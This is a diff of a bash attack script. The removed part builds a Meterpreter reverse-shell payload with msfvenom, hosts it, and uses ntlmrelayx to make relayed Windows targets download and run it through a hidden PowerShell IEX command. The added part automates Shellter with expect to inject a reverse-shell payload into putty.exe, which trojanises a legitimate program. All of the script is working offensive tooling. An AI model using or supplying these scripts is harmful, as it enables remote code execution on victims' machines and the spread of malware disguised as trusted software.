@@ -1,34 +1,56 @@
 #!/usr/bin/env bash
 
-LBlue='\033[0;94m'      # Ligth Blue
-BBlue='\033[1;34m'      # Bold Blue
-BWhite='\033[1;37m'     # Bold White
-Color_Off='\033[0m'     # Text Reset
+# Define the local host IP dynamically or set it statically
+LHOST=$(ip route get 1 | awk '{print $7; exit}')  # Dynamically find the local IP
 
-tput civis
+# Navigate to the directory containing shellter.exe
+cd /opt/shellter/
 
-while [ ! -f .attack ];do
-    clear
-    echo -e "${LBlue}[${BBlue}+${LBlue}] ${BWhite}Setting up Web Server...${Color_Off}\n"
-    sleep 5
-done
+# Start the expect script to automate interaction with shellter
+/usr/bin/expect <<EOF
+# Launch shellter with wine
+spawn wine shellter.exe
 
-HOST=$(cat host.txt)
+# Wait for the operation mode prompt and choose Auto
+expect "Choose Operation Mode - Auto/Manual (A/M/H):"
+send "A\r"
 
-# Set the variables for the payload
-PAYLOAD="windows/meterpreter/reverse_tcp"
-LHOST="$HOST"
-LPORT="5040"
-OUTPUT_FILE="meterpreter.ps1"
+# Wait for the PE Target prompt and specify the target executable
+expect "PE Target:"
+send "/opt/putty.exe\r"
 
-# Generate the Meterpreter payload using msfvenom
-msfvenom -p $PAYLOAD LHOST=$LHOST LPORT=$LPORT -f psh-cmd > $OUTPUT_FILE
+# Correct handling of the Enter key
+expect "Press \[Enter\] to continue..."
+send "\r"
 
-# Append the generated payload to a PowerShell script
-echo "powershell -exec bypass -nop -w hidden -c \"$($OUTPUT_FILE)\"" > PS.ps1
+# Wait for the stealth mode prompt and choose No
+expect "Enable Stealth Mode? (Y/N/H):"
+send "N\r"
 
-# Start a local web server to host the payload
-python3 -m http.server &>/dev/null &
+# Choose listed payload
+expect "listed or custom payload"
+send "L\r"
 
-# Send the command to the target to download and execute the script
-ntlmrelayx.py -tf target.txt -c "powershell IEX(New-Object Net.WebClient).downloadString('http://$HOST:8000/PS.ps1')" -smb2support
+# Select payload #3
+expect "Select payload number:"
+send "3\r"
+
+# Set LHOST and LPORT
+expect "SET LHOST:"
+send "${LHOST}\r"
+expect "SET LPORT:"
+send "8081\r"
+
+# Wait for Injection verification and print success message
+expect "Injection: Verified!"
+send_user "Injection Verified!\r"
+
+# Correct handling of the Enter key
+expect "Press \[Enter\] to continue..."
+send "\r"
+
+# Ensure the script waits for Shellter to finish
+expect eof
+EOF
+
+# Return to the original directory or continue with further commands
